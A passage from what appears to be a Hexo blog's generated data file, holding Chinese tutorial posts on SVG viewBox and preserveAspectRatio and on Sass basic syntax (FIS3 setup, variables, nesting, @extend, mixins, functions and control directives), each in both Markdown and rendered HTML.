对齐</li>\n<li>meet：表示如何维持高宽比</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>xMin</td>\n<td>viewport 和 viewBox 左边对齐</td>\n</tr>\n<tr>\n<td>xMid</td>\n<td>viewport 和 viewBox  x 轴中心对齐</td>\n</tr>\n<tr>\n<td>xMax</td>\n<td>viewport 和 viewBox 右边对齐</td>\n</tr>\n<tr>\n<td>YMin</td>\n<td>viewport 和 viewBox 上边缘对齐</td>\n</tr>\n<tr>\n<td>YMid</td>\n<td>viewport 和 viewBox  y 轴中心点对齐</td>\n</tr>\n<tr>\n<td>YMax</td>\n<td>viewport 和 viewBox 下边缘对齐</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>meet</td>\n<td>保持纵横比缩放 viewBox 适应 viewport</td>\n</tr>\n<tr>\n<td>slice</td>\n<td>保持纵横比同时比例小的方向放大填满 viewport</td>\n</tr>\n<tr>\n<td>none</td>\n<td>扭曲纵横比以充分适应 viewport</td>\n</tr>\n</tbody></table>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"viewBox-与-preserveAspectRatio\"><a href=\"#viewBox-与-preserveAspectRatio\" class=\"headerlink\" title=\"viewBox 与 preserveAspectRatio\"></a>viewBox 与 preserveAspectRatio</h1><h3 id=\"视窗（viewport）\"><a href=\"#视窗（viewport）\" class=\"headerlink\" title=\"视窗（viewport）\"></a>视窗（viewport）</h3><p>视窗是指一块 SVG 可见的区域</p>\n<p>如 <code>&lt;svg width=&quot;500&quot; height=&quot;300&quot;&gt;&lt;/svg&gt;</code> 定义了一个视区，宽 500 单位，高 300 单位（并没有指定是像素，也可以指定为 <code>em</code>、<code>rem</code> 等）</p>\n<p>当 <code>width</code> 、 <code>height</code> 如果是纯数字，使用的就是 “像素” 作为单位的，SVG 中的其他子元素也是相同的原理</p>\n<h3 id=\"视图盒子（viewBox）\"><a href=\"#视图盒子（viewBox）\" class=\"headerlink\" title=\"视图盒子（viewBox）\"></a>视图盒子（viewBox）</h3><p>viewBox 属性相当于给 svg 图像设置了一个选区，然后将这个选区填充到整个 svg 画布中，最后的看到的结果就是选区中的图像缩放后的结果。</p>\n<p>这个属性有四个值，分别为坐标系统中的x值，y值，宽度，高度，属性值之间用空格或者是逗号合开。</p>\n<p>实际上这 4 个值唯一的确定了一个矩形和矩形的位置，x值和y值是矩形左上角顶点的坐标，宽和高分别是矩形的宽和高，单位为像素，这个矩形就是上述的选区。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0,0,40,30&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border:1px solid #cd0000;&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;10&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;5&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;15&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;#cd0000&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"preserveAspectRatio\"><a href=\"#preserveAspectRatio\" class=\"headerlink\" title=\"preserveAspectRatio\"></a>preserveAspectRatio</h3><p><code>preserveAspectRatio=&quot;xMidYMid meet&quot;</code></p>\n<ul>\n<li>xMidYMid：表示 viewBox 如何与 viewport 对齐</li>\n<li>meet：表示如何维持高宽比</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>xMin</td>\n<td>viewport 和 viewBox 左边对齐</td>\n</tr>\n<tr>\n<td>xMid</td>\n<td>viewport 和 viewBox  x 轴中心对齐</td>\n</tr>\n<tr>\n<td>xMax</td>\n<td>viewport 和 viewBox 右边对齐</td>\n</tr>\n<tr>\n<td>YMin</td>\n<td>viewport 和 viewBox 上边缘对齐</td>\n</tr>\n<tr>\n<td>YMid</td>\n<td>viewport 和 viewBox  y 轴中心点对齐</td>\n</tr>\n<tr>\n<td>YMax</td>\n<td>viewport 和 viewBox 下边缘对齐</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>meet</td>\n<td>保持纵横比缩放 viewBox 适应 viewport</td>\n</tr>\n<tr>\n<td>slice</td>\n<td>保持纵横比同时比例小的方向放大填满 viewport</td>\n</tr>\n<tr>\n<td>none</td>\n<td>扭曲纵横比以充分适应 viewport</td>\n</tr>\n</tbody></table>\n"},{"title":"Sass 基础语法","date":"2021-03-23T16:00:00.000Z","_content":"\n\n# 1、 FIS3 中集成 Sass\n\n## 1.1 插件安装\n\n* sass 编译 `npm i fis3-parser-node-sass -g`\n* 前缀添加 `npm i fis3-preprocessor-cssprefixer -g` 必须全局安装\n\n```javascript\nfis.match('*.scss', {\n    parser: fis.plugin('node-sass'),\n    rExt: 'css',\n    release: '$0'\n});\nfis.match('_*.scss', {\n    release: false\n});\nfis.match('*.scss', {\n    preprocessor: fis.plugin('cssprefixer', {\n        \"browsers\": [\"Android >= 2.1\", \"iOS >= 4\", \"ie >= 8\", \"firefox >= 15\"],\n        \"cascade\": true\n    })\n});\n```\n## 1.2 目录规范\n\n* base\n    * _reset.scss\n    * _typography.scss\n* helpers\n    * _function.scss\n    * _mixin.scss\n    * _variable.scss\n* components\n    * _header.scss\n    * _footer.scss\n    * _buttons.scss\n    * _cards.scss\n* layouts\n    * _responsive.scss\n* pages\n    * _page1.scss\n    * _page2.scss\n* lib\n    * bootstrap.scss\n    * font-awesome.scss\n* main.scss\n\n## 1.3 编码规范\n\n### 1.3.1 Sass 性能优化\n\n* 用 class 分类代替子代选择器\n* 建议用子选择器，而不是后代选择器，提高性能\n* 特殊类别选择属性选择器\n\n### 1.3.2 Sass 属性声明顺序\n\n* z-index, display\n* position, left, top, right, bottom\n* overflow, float, clear\n* margin, padding\n* background, border\n* font, text\n* scss 代码块应有的顺序\n\n### 1.3.2 Sass 使用规则\n\n* 当前选择器的样式属性\n* 父级选择器的伪类选择器 (`:first-letter`, `:hover`, `:active`)\n* 伪类元素 (`:before`、`:after`)\n* 父级选择器的声明样式 (`.selected`, `.active`, `.enlarged`)\n* 用 Sass 的上下文媒体查询\n* 子选择器作为最后的部分\n\n\n## 2、 Sass 语法说明\n\n### 2.1 后缀名\n\n* Sass文件后缀名可为 `.scss`、 `.sass`\n* 推荐使用 `.scss`，与 `css` 语法完全兼容\n* 不推荐使用 `.sass` 要求更严格，不能使用 `{}` 和 `;`\n\n### 2.2 文件导入\n\n* 可在 `Sass` 文件中导入 `Sass` 文件或 `css` 文件 （对于 `Sass` 文件可不写后缀名）\n* 基础文件以 _ 开头，如变量声明、混入等，（导入时可不写下划线）\n\n> 示例：\n> * `@import \"page/page1\"`\n> * `@import \"lib/bootstrap.css\"`\n\n\n### 2.3 变量\n\n* 使用 `$` 声明并使用变量\n* 变量可被覆盖（就近原则或在变量后面添加 `!default`）\n* 变量可为全局或局部 （在选择器外部声明、选择器内部声明）\n* 当变量为字符串时，可在类名、属性名中引用，如 `border-#{$variableName}`\n* 变量为 list 结构 （在 `$size: 18px 30px 34px` 使用 `nth($size, 1)` 调用）\n* 变量为 map 结构（使用 `@each $key, $value in $map` 调用）\n\n```scss\n$gray: #666 !default;\n$directory: top;\n$size: 18px 30px 34px;\n$heading: (h1: #0aa, h2: #cc0, h3: #b0b);\nbody {\n    color: #f00;\n    a {\n        font-size: nth($size, 1);\n        color: $gray;\n        border-#{$directory}: 1 px solid $gray;\n        &:hover {\n            $font-size: 40 px;\n            font-size: $font-size;\n        }\n    }\n    @each $head, $color in $heading {\n        #{$head} {\n            color: $color;\n        }\n    }\n}\n```\n\n### 2.4 嵌套\n\n* 可使用选择器嵌套、属性嵌套 （属性嵌套并没什么用）\n* `@at-root` 可跳出所有的上级选择器 （可同时对过个选择器操作）\n* `#{&}__modifer` 可实现 BEM 特性\n\n```scss\n// 编译前的 scss 文件\n.footer {\n    font-size: 16px;\n    @at-root #{&}__modifer {\n        color: #333\n    }\n    @at-root .nav & {\n        color: #f0f;\n    }\n    @at-root {\n        .child1 {\n            color: #f00;\n        }\n        .child2 {\n            color: #ff0;\n        }\n    }\n}\n```\n\n```scss\n// 编译后的 css 文件\n.footer {\n    font-size: 16px;\n}\n\n.footer__modifer {\n    color: #333;\n}\n\n.nav .footer {\n    color: #f0f;\n}\n\n.child1 {\n    color: #f00;\n}\n\n.child2 {\n    color: #ff0;\n}\n```\n\n### 2.4 占位选择器\n\n* 使用 `%` 声明占位选择器， 通过 `@extend` 调用占位选择器\n* 当占位选择器没被调用时，不会被解析出来 （推荐使用）\n* 占位选择器可以用其定义一些基础的样式文件\n\n```scss\n// 编译前的 scss 文件\n% my-sty {\n    color: #aaa;\n    font-size: 10px;\n}\n\n.child-1 {\n    @extend %my-sty;\n}\n```\n\n```scss\n// 编译后的 css 文件\n.child1 {\n    color: #aaa;\n    font-size: 10px;\n}\n```\n\n### 2.5 继承\n\n说明：继承是建立在语义化的关系上。当一个元素拥有的类（如 `.seriousError` ）表明它属于另一个类（如 `.error`），此时适合用继承\n\n* 使用 `%extend` 进行继承\n* 可以继承任何定义给单个元素的选择器，比如 `.special.cool`、`a:hover`\n\n```scss\n// 编译前\na:hover {\n    text-decoration: underline;\n}\n.hoverlink {\n    @extend a: hover;\n}\n```\n\n```scss\n// 编译后\na:hover, .hoverlink {\n  text-decoration: underline;\n}\n```\n\n```scss\n// 编译前\n.error {\n    border: 1px #f00;\n    background-color: #fdd;\n}\n.seriousError {\n    @extend .error;\n    border-width: 3px;\n}\n```\n\n```scss\n// 编译后\n.error, .seriousError {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n\n.seriousError {\n  border-width: 3px;\n}\n```\n\n```scss\n// 编译前\n.error {\n    border: 1px #f00;\n    background-color: #fdd;\n}\n.error.intrusion {\n    background-image: url(\"/image/hacked.png\");\n}\n.seriousError {\n    @extend .error;\n    border-width: 3px;\n}\n```\n\n```scss\n// 编译后\n.error, .seriousError {\n    border: 1px #f00;\n    background-color: #fdd;\n}\n.error.intrusion, .intrusion.seriousError {\n    background-image: url(\"/image/hacked.png\");\n}\n.seriousError {\n    border-width: 3px;\n}\n```\n\n### 2.6 混合\n\n说明：混合指令用于定义可重复的样式，避免使用无语义的 `class`，如 `.clearfix`、`.float-left`\n\n* 使用 `@mixin` 声明混合指令，通过` @include` 调用混合指令\n* 当混合没被调用时，不会被解析出来 （推荐使用）\n* 混合样式中也可以嵌套其他混合样式\n* 当混合为无参时，推荐使用占位选择器来实现\n\n```scss\n// 编译前的 scss 文件\n@mixin ellipsis ($width: 100px) {\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    width: $width;\n}\n\n.text-ellipsis {\n    color: #0ff;\n    @include ellipsis;\n}\n\n.text2-ellipsis {\n    color: #999;\n    @include ellipsis($width: 300px);\n}\n```\n\n```scss\n// 编译后的 css 文件\n.text-ellipsis {\n    color: #0ff;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    width: 100px;\n}\n\n.text2-ellipsis {\n    color: #999;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    width: 300px;\n}\n```\n\n```scss\n// 编译前\n@mixin height-light {\n\tbackground: #fc0;\n}\n\n@mixin head-text {\n\tfont-size: 24px;\n}\n\n@mixin computed {\n\t@include height-light;\n\t@include head-text;\n}\n\nspan {\n\t@include computed\n}\n```\n\n```scss\n// 编译后\nspan {\n    background: #fc0;\n    font-size: 24px;\n}\n```\n\n### 2.7 函数\n\n* 使用 `@fuction funName (param) {}` 声明，通过 `funName()` 调用\n* 可使用 `sass` 自带的函数，如 `lighten()`、`darken()` 等\n\n```scss\n// 编译前的 scss 文件\n@function addSize ($size) {\n    $baseSize: 12px;\n    @return $baseSize+$size;\n}\n\n.link-1 {\n    $blue: #00A3CF;\n    font-size: addSize(10px);\n    color: darken($blue, 25%);\n}\n\n.link-2 {\n    $blue: #00A3CF;\n    font-size: addSize(10px);\n    color: lighten($blue, 20%);\n}\n```\n\n```scss\n// 编译后的 css 文件\n.link-1 {\n    font-size: 22px;\n    color: #003f50;\n}\n\n.link-2 {\n    font-size: 22px;\n    color: #36d4ff;\n}\n```\n\n### 2.8 其他\n\n* 运算 可对遍历、数值、像素、颜色等进行四则运算（操作符前后需要空格）\n* 三目运算 条件为真/假时，返回不同的值 （与函数有点类似）\n* `@if` 条件成立后执行 `{}` 内的语句\n* `@each` 遍历 `list` 变量、`map` 变量\n* `@for` 在指定数值范围内遍历\n\n```scss\n// sass 运算、 @if、三目运算 示例\n// 编译前的 scss 文件\n$hasSubMenu: true;\n$level: 2;\n.wrapper {\n    color: if($hasSubMenu, #f00, #00f);\n    @if $hasSubMenu {\n        background-image: url('/images/down-icon.jpg');\n    }\n    @if $level==2 {\n        height: 60px * 2;\n        background: #f0f;\n    }\n    @else if $level==3 {\n        height: 60px * 3;\n        background: #f00;\n    }\n}\n\n// 编译后的 css 文件\n.wrapper {\n    background-image: url(\"/images/down-icon.jpg\");\n    height: 120px;\n    color: #f00;\n    background: #f0f;\n}\n```\n\n```scss\n// @each 示例\n// 编译前的 scss 文件\n$animal-list: puma, sea-slug, egret;\n@each $animal in $animal-list {\n    .#{$animal}-icon {\n        background-image: url('/images/#{$animal}.png');\n    }\n}\n\n// 编译后的 css 文件\n.puma-icon {\n    background-image: url(\"/images/puma.png\");\n}\n\n.sea-slug-icon {\n    background-image: url(\"/images/sea-slug.png\");\n}\n\n.egret-icon {\n    background-image: url(\"/images/egret.png\");\n}\n```\n\n```scss\n// @for 示例\n// 编译前的 scss 文件\n@for $i from 1 to 4 {\n    .content-#{$i} {\n        font-size: {\n            font-size: 14px + $i * 2px;\n        }\n    }\n}\n\n// 编译后的 css 文件\n.content-1 {\n    font-size: 16px;\n}\n\n.content-2 {\n    font-size: 18px;\n}\n\n.content-3 {\n    font-size: 20px;\n}\n```","source":"_posts/Sass/Sass 基础语法.md","raw":"---\ntitle: Sass 基础语法\ncategories: [CSS, Sass]\ntags: [CSS, Sass]\ndate: 2021-03-24\n---\n\n\n# 1、 FIS3 中集成 Sass\n\n## 1.1 插件安装\n\n* sass 编译 `npm i fis3-parser-node-sass -g`\n* 前缀添加 `npm i fis3-preprocessor-cssprefixer -g` 必须全局安装\n\n```javascript\nfis.match('*.scss', {\n    parser: fis.plugin('node-sass'),\n    rExt: 'css',\n    release: '$0'\n});\nfis.match('_*.scss', {\n    release: false\n});\nfis.match('*.scss', {\n    preprocessor: fis.plugin('cssprefixer', {\n        \"browsers\": [\"Android >= 2.1\", \"iOS >= 4\", \"ie >= 8\", \"firefox >= 15\"],\n        \"cascade\": true\n    })\n});\n```\n## 1.2 目录规范\n\n* base\n    * _reset.scss\n    * _typography.scss\n* helpers\n    * _function.scss\n    * _mixin.scss\n    * _variable.scss\n* components\n    * _header.scss\n    * _footer.scss\n    * _buttons.scss\n    * _cards.scss\n* layouts\n    * _responsive.scss\n* pages\n    * _page1.scss\n    * _page2.scss\n* lib\n    * bootstrap.scss\n    * font-awesome.scss\n* main.scss\n\n## 1.3 编码规范\n\n### 1.3.1 Sass 性能优化\n\n* 用 class 分类代替子代选择器\n* 建议用子选择器，而不是后代选择器，提高性能\n* 特殊类别选择属性选择器\n\n### 1.3.2 Sass 属性声明顺序\n\n* z-index, display\n* position, left, top, right, bottom\n* overflow, float, clear\n* margin, padding\n* background, border\n* font, text\n* scss 代码块应有的顺序\n\n### 1.3.2 Sass 使用规则\n\n* 当前选择器的样式属性\n* 父级选择器的伪类选择器 (`:first-letter`, `:hover`, `:active`)\n* 伪类元素 (`:before`、`:after`)\n* 父级选择器的声明样式 (`.selected`, `.active`, `.enlarged`)\n* 用 Sass 的上下文媒体查询\n* 子选择器作为最后的部分\n\n\n## 2、 Sass 语法说明\n\n### 2.1 后缀名\n\n* Sass文件后缀名可为 `.scss`、 `.sass`\n* 推荐使用 `.scss`，与 `css` 语法完全兼容\n* 不推荐使用 `.sass` 要求更严格，不能使用 `{}` 和 `;`\n\n### 2.2 文件导入\n\n* 可在 `Sass` 文件中导入 `Sass` 文件或 `css` 文件 （对于 `Sass` 文件可不写后缀名）\n* 基础文件以 _ 开头，如变量声明、混入等，（导入时可不写下划线）\n\n> 示例：\n> * `@import \"page/page1\"`\n> * `@import \"lib/bootstrap.css\"`\n\n\n### 2.3 变量\n\n* 使用 `$` 声明并使用变量\n* 变量可被覆盖（就近原则或在变量后面添加 `!default`）\n* 变量可为全局或局部 （在选择器外部声明、选择器内部声明）\n* 当变量为字符串时，可在类名、属性名中引用，如 `border-#{$variableName}`\n* 变量为 list 结构 （在 `$size: 18px 30px 34px` 使用 `nth($size, 1)` 调用）\n* 变量为 map 结构（使用 `@each $key, $value in $map` 调用）\n\n```scss\n$gray: #666 !default;\n$directory: top;\n$size: 18px 30px 34px;\n$heading: (h1: #0aa, h2: #cc0, h3: #b0b);\nbody {\n    color: #f00;\n    a {\n        font-size: nth($size, 1);\n        color: $gray;\n        border-#{$directory}: 1 px solid $gray;\n        &:hover {\n            $font-size: 40 px;\n            font-size: $font-size;\n        }\n    }\n    @each $head, $color in $heading {\n        #{$head} {\n            color: $color;\n        }\n    }\n}\n```\n\n### 2.4 嵌套\n\n* 可使用选择器嵌套、属性嵌套 （属性嵌套并没什么用）\n* `@at-root` 可跳出所有的上级选择器 （可同时对过个选择器操作）\n* `#{&}__modifer` 可实现 BEM 特性\n\n```scss\n// 编译前的 scss 文件\n.footer {\n    font-size: 16px;\n    @at-root #{&}__modifer {\n        color: #333\n    }\n    @at-root .nav & {\n        color: #f0f;\n    }\n    @at-root {\n        .child1 {\n            color: #f00;\n        }\n        .child2 {\n            color: #ff0;\n        }\n    }\n}\n```\n\n```scss\n// 编译后的 css 文件\n.footer {\n    font-size: 16px;\n}\n\n.footer__modifer {\n    color: #333;\n}\n\n.nav .footer {\n    color: #f0f;\n}\n\n.child1 {\n    color: #f00;\n}\n\n.child2 {\n    color: #ff0;\n}\n```\n\n### 2.4 占位选择器\n\n* 使用 `%` 声明占位选择器， 通过 `@extend` 调用占位选择器\n* 当占位选择器没被调用时，不会被解析出来 （推荐使用）\n* 占位选择器可以用其定义一些基础的样式文件\n\n```scss\n// 编译前的 scss 文件\n% my-sty {\n    color: #aaa;\n    font-size: 10px;\n}\n\n.child-1 {\n    @extend %my-sty;\n}\n```\n\n```scss\n// 编译后的 css 文件\n.child1 {\n    color: #aaa;\n    font-size: 10px;\n}\n```\n\n### 2.5 继承\n\n说明：继承是建立在语义化的关系上。当一个元素拥有的类（如 `.seriousError` ）表明它属于另一个类（如 `.error`），此时适合用继承\n\n* 使用 `%extend` 进行继承\n* 可以继承任何定义给单个元素的选择器，比如 `.special.cool`、`a:hover`\n\n```scss\n// 编译前\na:hover {\n    text-decoration: underline;\n}\n.hoverlink {\n    @extend a: hover;\n}\n```\n\n```scss\n// 编译后\na:hover, .hoverlink {\n  text-decoration: underline;\n}\n```\n\n```scss\n// 编译前\n.error {\n    border: 1px #f00;\n    background-color: #fdd;\n}\n.seriousError {\n    @extend .error;\n    border-width: 3px;\n}\n```\n\n```scss\n// 编译后\n.error, .seriousError {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n\n.seriousError {\n  border-width: 3px;\n}\n```\n\n```scss\n// 编译前\n.error {\n    border: 1px #f00;\n    background-color: #fdd;\n}\n.error.intrusion {\n    background-image: url(\"/image/hacked.png\");\n}\n.seriousError {\n    @extend .error;\n    border-width: 3px;\n}\n```\n\n```scss\n// 编译后\n.error, .seriousError {\n    border: 1px #f00;\n    background-color: #fdd;\n}\n.error.intrusion, .intrusion.seriousError {\n    background-image: url(\"/image/hacked.png\");\n}\n.seriousError {\n    border-width: 3px;\n}\n```\n\n### 2.6 混合\n\n说明：混合指令用于定义可重复的样式，避免使用无语义的 `class`，如 `.clearfix`、`.float-left`\n\n* 使用 `@mixin` 声明混合指令，通过` @include` 调用混合指令\n* 当混合没被调用时，不会被解析出来 （推荐使用）\n* 混合样式中也可以嵌套其他混合样式\n* 当混合为无参时，推荐使用占位选择器来实现\n\n```scss\n// 编译前的 scss 文件\n@mixin ellipsis ($width: 100px) {\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    width: $width;\n}\n\n.text-ellipsis {\n    color: #0ff;\n    @include ellipsis;\n}\n\n.text2-ellipsis {\n    color: #999;\n    @include ellipsis($width: 300px);\n}\n```\n\n```scss\n// 编译后的 css 文件\n.text-ellipsis {\n    color: #0ff;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    width: 100px;\n}\n\n.text2-ellipsis {\n    color: #999;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    width: 300px;\n}\n```\n\n```scss\n// 编译前\n@mixin height-light {\n\tbackground: #fc0;\n}\n\n@mixin head-text {\n\tfont-size: 24px;\n}\n\n@mixin computed {\n\t@include height-light;\n\t@include head-text;\n}\n\nspan {\n\t@include computed\n}\n```\n\n```scss\n// 编译后\nspan {\n    background: #fc0;\n    font-size: 24px;\n}\n```\n\n### 2.7 函数\n\n* 使用 `@fuction funName (param) {}` 声明，通过 `funName()` 调用\n* 可使用 `sass` 自带的函数，如 `lighten()`、`darken()` 等\n\n```scss\n// 编译前的 scss 文件\n@function addSize ($size) {\n    $baseSize: 12px;\n    @return $baseSize+$size;\n}\n\n.link-1 {\n    $blue: #00A3CF;\n    font-size: addSize(10px);\n    color: darken($blue, 25%);\n}\n\n.link-2 {\n    $blue: #00A3CF;\n    font-size: addSize(10px);\n    color: lighten($blue, 20%);\n}\n```\n\n```scss\n// 编译后的 css 文件\n.link-1 {\n    font-size: 22px;\n    color: #003f50;\n}\n\n.link-2 {\n    font-size: 22px;\n    color: #36d4ff;\n}\n```\n\n### 2.8 其他\n\n* 运算 可对遍历、数值、像素、颜色等进行四则运算（操作符前后需要空格）\n* 三目运算 条件为真/假时，返回不同的值 （与函数有点类似）\n* `@if` 条件成立后执行 `{}` 内的语句\n* `@each` 遍历 `list` 变量、`map` 变量\n* `@for` 在指定数值范围内遍历\n\n```scss\n// sass 运算、 @if、三目运算 示例\n// 编译前的 scss 文件\n$hasSubMenu: true;\n$level: 2;\n.wrapper {\n    color: if($hasSubMenu, #f00, #00f);\n    @if $hasSubMenu {\n        background-image: url('/images/down-icon.jpg');\n    }\n    @if $level==2 {\n        height: 60px * 2;\n        background: #f0f;\n    }\n    @else if $level==3 {\n        height: 60px * 3;\n        background: #f00;\n    }\n}\n\n// 编译后的 css 文件\n.wrapper {\n    background-image: url(\"/images/down-icon.jpg\");\n    height: 120px;\n    color: #f00;\n    background: #f0f;\n}\n```\n\n```scss\n// @each 示例\n// 编译前的 scss 文件\n$animal-list: puma, sea-slug, egret;\n@each $animal in $animal-list {\n    .#{$animal}-icon {\n        background-image: url('/images/#{$animal}.png');\n    }\n}\n\n// 编译后的 css 文件\n.puma-icon {\n    background-image: url(\"/images/puma.png\");\n}\n\n.sea-slug-icon {\n    background-image: url(\"/images/sea-slug.png\");\n}\n\n.egret-icon {\n    background-image: url(\"/images/egret.png\");\n}\n```\n\n```scss\n// @for 示例\n// 编译前的 scss 文件\n@for $i from 1 to 4 {\n    .content-#{$i} {\n        font-size: {\n            font-size: 14px + $i * 2px;\n        }\n    }\n}\n\n// 编译后的 css 文件\n.content-1 {\n    font-size: 16px;\n}\n\n.content-2 {\n    font-size: 18px;\n}\n\n.content-3 {\n    font-size: 20px;\n}\n```","slug":"Sass/Sass 基础语法","published":1,"updated":"2021-04-28T02:28:59.023Z","_id":"cko0u90va0000qd6r78a92gmp","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"1、-FIS3-中集成-Sass\"><a href=\"#1、-FIS3-中集成-Sass\" class=\"headerlink\" title=\"1、 FIS3 中集成 Sass\"></a>1、 FIS3 中集成 Sass</h1><h2 id=\"1-1-插件安装\"><a href=\"#1-1-插件安装\" class=\"headerlink\" title=\"1.1 插件安装\"></a>1.1 插件安装</h2><ul>\n<li>sass 编译 <code>npm i fis3-parser-node-sass -g</code></li>\n<li>前缀添加 <code>npm i fis3-preprocessor-cssprefixer -g</code> 必须全局安装</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fis.match(<span class=\"string\">&#x27;*.scss&#x27;</span>, &#123;</span><br><span class=\"line\">    parser: fis.plugin(<span class=\"string\">&#x27;node-sass&#x27;</span>),</span><br><span class=\"line\">    rExt: <span class=\"string\">&#x27;css&#x27;</span>,</span><br><span class=\"line\">    release: <span class=\"string\">&#x27;$0&#x27;</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">fis.match(<span class=\"string\">&#x27;_*.scss&#x27;</span>, &#123;</span><br><span class=\"line\">    release: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">fis.match(<span class=\"string\">&#x27;*.scss&#x27;</span>, &#123;</span><br><span class=\"line\">    preprocessor: fis.plugin(<span class=\"string\">&#x27;cssprefixer&#x27;</span>, &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;browsers&quot;</span>: [<span class=\"string\">&quot;Android &gt;= 2.1&quot;</span>, <span class=\"string\">&quot;iOS &gt;= 4&quot;</span>, <span class=\"string\">&quot;ie &gt;= 8&quot;</span>, <span class=\"string\">&quot;firefox &gt;= 15&quot;</span>],</span><br><span class=\"line\">        <span class=\"string\">&quot;cascade&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-目录规范\"><a href=\"#1-2-目录规范\" class=\"headerlink\" title=\"1.2 目录规范\"></a>1.2 目录规范</h2><ul>\n<li>base<ul>\n<li>_reset.scss</li>\n<li>_typography.scss</li>\n</ul>\n</li>\n<li>helpers<ul>\n<li>_function.scss</li>\n<li>_mixin.scss</li>\n<li>_variable.scss</li>\n</ul>\n</li>\n<li>components<ul>\n<li>_header.scss</li>\n<li>_footer.scss</li>\n<li>_buttons.scss</li>\n<li>_cards.scss</li>\n</ul>\n</li>\n<li>layouts<ul>\n<li>_responsive.scss</li>\n</ul>\n</li>\n<li>pages<ul>\n<li>_page1.scss</li>\n<li>_page2.scss</li>\n</ul>\n</li>\n<li>lib<ul>\n<li>bootstrap.scss</li>\n<li>font-awesome.scss</li>\n</ul>\n</li>\n<li>main.scss</li>\n</ul>\n<h2 id=\"1-3-编码规范\"><a href=\"#1-3-编码规范\" class=\"headerlink\" title=\"1.3 编码规范\"></a>1.3 编码规范</h2><h3 id=\"1-3-1-Sass-性能优化\"><a href=\"#1-3-1-Sass-性能优化\" class=\"headerlink\" title=\"1.3.1 Sass 性能优化\"></a>1.3.1 Sass 性能优化</h3><ul>\n<li>用 class 分类代替子代选择器</li>\n<li>建议用子选择器，而不是后代选择器，提高性能</li>\n<li>特殊类别选择属性选择器</li>\n</ul>\n<h3 id=\"1-3-2-Sass-属性声明顺序\"><a href=\"#1-3-2-Sass-属性声明顺序\" class=\"headerlink\" title=\"1.3.2 Sass 属性声明顺序\"></a>1.3.2 Sass 属性声明顺序</h3><ul>\n<li>z-index, display</li>\n<li>position, left, top, right, bottom</li>\n<li>overflow, float, clear</li>\n<li>margin, padding</li>\n<li>background, border</li>\n<li>font, text</li>\n<li>scss 代码块应有的顺序</li>\n</ul>\n<h3 id=\"1-3-2-Sass-使用规则\"><a href=\"#1-3-2-Sass-使用规则\" class=\"headerlink\" title=\"1.3.2 Sass 使用规则\"></a>1.3.2 Sass 使用规则</h3><ul>\n<li>当前选择器的样式属性</li>\n<li>父级选择器的伪类选择器 (<code>:first-letter</code>, <code>:hover</code>, <code>:active</code>)</li>\n<li>伪类元素 (<code>:before</code>、<code>:after</code>)</li>\n<li>父级选择器的声明样式 (<code>.selected</code>, <code>.active</code>, <code>.enlarged</code>)</li>\n<li>用 Sass 的上下文媒体查询</li>\n<li>子选择器作为最后的部分</li>\n</ul>\n<h2 id=\"2、-Sass-语法说明\"><a href=\"#2、-Sass-语法说明\" class=\"headerlink\" title=\"2、 Sass 语法说明\"></a>2、 Sass 语法说明</h2><h3 id=\"2-1-后缀名\"><a href=\"#2-1-后缀名\" class=\"headerlink\" title=\"2.1 后缀名\"></a>2.1 后缀名</h3><ul>\n<li>Sass文件后缀名可为 <code>.scss</code>、 <code>.sass</code></li>\n<li>推荐使用 